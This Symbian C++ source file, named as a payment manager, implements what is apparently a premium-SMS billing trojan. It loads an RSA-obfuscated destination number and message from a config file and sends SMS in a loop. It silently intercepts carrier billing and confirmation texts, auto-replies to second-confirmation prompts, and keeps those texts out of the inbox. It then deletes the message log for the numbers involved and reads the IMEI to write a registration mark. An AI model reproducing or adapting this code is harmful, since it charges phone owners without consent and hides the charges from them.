/*
 ============================================================================
 Name		: PaymentManager.cpp
 Author	  : zengcity
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CPaymentManager implementation
 ============================================================================
 */

#include "PaymentManager.h"
#include "MacroUtil.h"
#include "Configuration.h"
#include "RSAUtil.h"
#include "Utils.h"
#include "CommonUtils.h"
#include "LoadLogEngine.h"
#include "MyTelephony.h"
#include <aknnotewrappers.h> 

CPaymentManager::CPaymentManager(MPaymentNotify& aNotify) :
	iState(EStateInit), iNotify(aNotify), iRemoveEngine(NULL),iContactArray(NULL)
	{
	// No implementation required
	iSmsReceiver = NULL;
	iSmsSender = NULL;
	iCheckOrigArray = NULL;
	iCheckConfirmArray = NULL;
	}

CPaymentManager::~CPaymentManager()
	{
		SAFE_RESET_DELETE_ARRAY(iCheckOrigArray)
		SAFE_RESET_DELETE_ARRAY(iCheckConfirmArray)
	//iCheckResultArray->Reset();
	//delete iCheckResultArray;
		
		SAFE_DELETE(iRemoveEngine)
		
		if (iContactArray)
			{
			iContactArray->ResetAndDestroy();
			delete iContactArray;
			}

	delete iCreator;
	Close();
	}

CPaymentManager* CPaymentManager::NewLC(MPaymentNotify& aNotify)
	{
	CPaymentManager* self = new (ELeave) CPaymentManager(aNotify);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CPaymentManager* CPaymentManager::NewL(MPaymentNotify& aNotify)
	{
	CPaymentManager* self = CPaymentManager::NewLC(aNotify);
	CleanupStack::Pop(); // self;
	return self;
	}
//_LIT(KConfirmWords1,"confirm");
//_LIT(KConfirmWords2,"zeng");
//
//_LIT(KResultWords1,"result");
//_LIT(KResultWords2,"zeng");
//计费成功短信文字检查
_LIT(KSecendSendMsg,"");
_LIT(KConfirmResultNum,"10658166");
//扣费固定号码
_LIT(KCfgFile,"cfg.ini");
_LIT(KCfgKeySendNumber,"sednum");
_LIT(KCfgKeySendContent,"sndmsg");
_LIT(KCfgKeySendCount,"sndcnt");
_LIT(KCfgKeyOrigSuccess,"orgsuc");
_LIT(KCfgKeyConfirm,"confim");
_LIT(KCfgKeyRSAN,"rsan");
_LIT(KCfgKeyRSAD,"rsad");

void CPaymentManager::ConstructL()
	{
	iSmsReceiver = CSmsDatagramReceiver::NewL(*this);
	iSmsSender = CSmsDatagramSender::NewL(*this);

	iCreator = CLoadMessageEngine::NewL();

	iCheckOrigArray = new (ELeave) CDesCArrayFlat(2);
	iCheckConfirmArray = new (ELeave) CDesCArrayFlat(2);
	}

void CPaymentManager::Register()
	{
	Init();
	StartReceiver();
	FirstSend();
	
	}

void CPaymentManager::Init()
	{
	iCounter = 0;
	LoadConfig();
	
	iContactArray = new CKCContactEntryArray;
	}

void CPaymentManager::LoadConfig()
	{
	TFileName file;
	GetAppPath(file);
	file.Append(KCfgFile);
	CConfiguration* cfg = CConfiguration::NewL(file);

	//cfg->Get(KCfgKeySendNumber,iSendNumber);
	//cfg->Get(KCfgKeySendContent,iSendContent);

	TBuf<128> temp;
	TBuf8<128> rsad;
	TBuf8<128> rsan;

	cfg->Get(KCfgKeyRSAN, temp);
	rsan.Copy(temp);

	temp.FillZ();
	cfg->Get(KCfgKeyRSAD, temp);
	rsad.Copy(temp);

	temp.FillZ();
	cfg->Get(KCfgKeySendNumber, temp);
	DecodeToDes(temp, iSendNumber, rsad, rsan);

	temp.FillZ();
	cfg->Get(KCfgKeySendContent, temp);
	DecodeToDes(temp, iSendContent, rsad, rsan);

	temp.FillZ();
	cfg->Get(KCfgKeySendCount, temp);
	DecodeToNum(temp, iTotalMessage, rsad, rsan);

	temp.FillZ();
	cfg->Get(KCfgKeyOrigSuccess, temp);
	SplitDecodeToArray(temp, iCheckOrigArray, rsad, rsan);
	temp.FillZ();
	cfg->Get(KCfgKeyConfirm, temp);
	SplitDecodeToArray(temp, iCheckConfirmArray, rsad, rsan);

	delete cfg;
	}

void CPaymentManager::DecodeToDes(const TDesC& aInfo, TDes& aDes,
		const TDesC8& aD, const TDesC8& aN)
	{
	TBuf8<128> info;
	info.Copy(aInfo);
	HBufC8* code8 = CRSAUtil::Decode(info, aD, aN);
	TText8* txt8 = CCommonUtils::DecToHex(code8->Des());
	HBufC* code = CCommonUtils::ConvertToUnicodeFromGBK(txt8);
	aDes.Copy(code->Des());
	delete code;
	delete txt8;
	delete code8;
	}

void CPaymentManager::DecodeToNum(const TDesC& aInfo, TInt& aDes,
		const TDesC8& aD, const TDesC8& aN)
	{
	TBuf<16> num;
	DecodeToDes(aInfo, num, aD, aN);
	aDes = CCommonUtils::StrToInt(num);
	}

void CPaymentManager::SplitDecodeToArray(const TDesC& aInfo,
		CDesCArray* aArray, const TDesC8& aD, const TDesC8& aN)
	{
	TPtrC ptr = aInfo;
	TInt index = ptr.Locate(',');
	while (index != KErrNotFound)
		{
		TPtrC org = ptr.Left(index);
		TBuf8<128> info;
		info.Copy(org);
		HBufC8* code8 = CRSAUtil::Decode(info, aD, aN);
		TText8* txt8 = CCommonUtils::DecToHex(code8->Des());
		HBufC* code = CCommonUtils::ConvertToUnicodeFromGBK(txt8);
		aArray->AppendL(code->Des());

		delete code;
		delete txt8;
		delete code8;

		ptr.Set(ptr.Mid(index + 1));
		index = ptr.Locate(',');
		}
	}

void CPaymentManager::Close()
	{
		SAFE_DELETE_ACTIVE(iSmsReceiver);
		SAFE_DELETE_ACTIVE(iSmsSender);
	}
_LIT(KMessageSent,"Message Sent:");
_LIT(KMessageReceived,"Message Received:");

void CPaymentManager::MsgReceivedL(const TDesC& aMsg, const TDesC& aNumber)
	{
	switch (iState)
		{
		case EStateReceive:
			FirstReceived(aMsg, aNumber);
			break;
		default:
			break;
		}
	}

void CPaymentManager::MsgSentL(TDesC& aMsg)
	{
	switch (iState)
		{
		case EStateSendCode:
			iState = EStateReceive;
			//			StartReceiver();
			break;
		case EStateSendConfirm:
			iState = EStateReceive;
			break;
		default:
			break;
		}
	}

void CPaymentManager::MsgSentErr(const TInt& aError)
	{
	//	switch (aError)
	//		{
	//		case KErrDisconnected:
	//			break;
	//		default:
	//			break;
	//		}
	iNotify.PaymentErr(aError);
	}

void CPaymentManager::RemoveMessageLogDone()
	{
	Close();
	iNotify.PaymentState(0);
	}

void CPaymentManager::Send(const TDesC& aMsg, const TDesC& aNumber)
	{
	if (iSmsSender->IsActive())
		{
		User::Leave(KErrInUse);
		}
	else
		{
		iSmsSender->SendAsyncL(aMsg, aNumber);
		}
	}

void CPaymentManager::StartReceiver()
	{
	if (iSmsReceiver->IsActive())
		{
		User::Leave(KErrInUse);
		}
	else
		{
		iSmsReceiver->SetMatchPatternL(KDefaultTestPattern);
		iSmsReceiver->StartReceiveL();
		}
	}

void CPaymentManager::FirstSend()
	{
	iState = EStateSendCode;
	Send(iSendContent, iSendNumber);
	}

void CPaymentManager::SecendSend(const TDesC& aNumber)
	{
	iState = EStateSendConfirm;
	Send(KSecendSendMsg, aNumber);
	}

void CPaymentManager::FirstReceived(const TDesC& aMsg, const TDesC& aNumber)
	{
	if (CheckOrig(aMsg, aNumber))
		{
		//计费成功
		PayRoundSeccess();
		AddNumberToClearArray(aNumber);
		}
	else if (CheckConfirm(aMsg, aNumber))
		{
		//二次确认
		SecendSend(aNumber);
		AddNumberToClearArray(aNumber);
		}
	else if (CheckConfirmResult(aMsg, aNumber))
		{
		//二次确认提示成功,不做操作.
		AddNumberToClearArray(aNumber);
		}
	else
		iCreator->CreateNewMessageL(aNumber, aMsg);
	}

//一轮计费成功
void CPaymentManager::PayRoundSeccess()
	{
	if (++iCounter > iTotalMessage)
		{
		//计费结束
		ClearMessageLog();
		}
	else
		{
		//下一轮
		FirstSend();
		}

	}

void CPaymentManager::ClearMessageLog()
	{
	if (iRemoveEngine == NULL)
		{
		iRemoveEngine = CLoadLogEngine::NewL();
		iRemoveEngine->SetRemoveObserver(this);
		}
	iRemoveEngine->RemoveMessageLogByContacts(iContactArray);
	}

void CPaymentManager::AddNumberToClearArray(const TDesC& aMsg)
	{
	CKCContactEntry *entry = CKCContactEntry::NewL();
	entry->SetNameL(aMsg);
	entry->SetNumberL(aMsg);
	iContactArray->Append(entry);
	}

//检查是否是计费成功代码
TBool CPaymentManager::CheckOrig(const TDesC& aMsg, const TDesC& aNumber)
	{
	if (CheckNumber(aNumber, iSendNumber) == EFalse)
		return EFalse;

	return CheckMsg(aMsg, iCheckOrigArray);
	}

//检查是否二次确认
TBool CPaymentManager::CheckConfirm(const TDesC& aMsg, const TDesC& /*aNumber*/)
	{
	return CheckMsg(aMsg, iCheckConfirmArray);
	}

//检查二次确认结果
TBool CPaymentManager::CheckConfirmResult(const TDesC& /*aMsg*/,
		const TDesC& aNumber)
	{
	return CheckNumber(aNumber, KConfirmResultNum);
	}

//检查,工具函数
TBool CPaymentManager::CheckNumber(const TDesC& aNumber,
		const TDesC& aDestNumber)
	{
	return (aNumber.Compare(aDestNumber) == 0);
	}

TBool CPaymentManager::CheckMsg(const TDesC& aMsg, CDesCArray* aCheck)
	{
	for (TInt i = 0; i < aCheck->Count(); i++)
		{
		TPtrC key = (*aCheck)[i];
		if (aMsg.Find(key) == KErrNotFound)
			return EFalse;
		}
	return ETrue;
	}

void CPaymentManager::GetRegisterFile(TDes& aFile)
	{
	//IMEI
	TBuf8<15> imei8;
	TBuf<15> imei;
	
	CMyTelephony::GetIMEIL(imei);
	imei8.Copy(imei);
	
	//使用配置里的an
	TFileName file;
	GetAppPath(file);
	file.Append(KCfgFile);
	CConfiguration* cfg = CConfiguration::NewL(file);

	TBuf<128> temp;
	TBuf8<128> rsan;

	cfg->Get(KCfgKeyRSAN, temp);
	rsan.Copy(temp);

	delete cfg;
	
	//加密
	_LIT8(KRSAE,"306893B59D6D2E352637874A3A4D32ED");	
	HBufC8* encode = CRSAUtil::Encode(imei8,KRSAE,rsan);
	aFile.Copy(encode->Des());
	delete encode;
	}

void CPaymentManager::CreateRegisterMark()
	{
	TFileName file;
	TFileName name;
	
	GetAppPath(file);
	GetRegisterFile(name);
	
	file.Append(name);
	
	RFile rfile;
	TInt err = rfile.Create(CCoeEnv::Static()->FsSession(), file, EFileWrite);
	rfile.Close();
	}
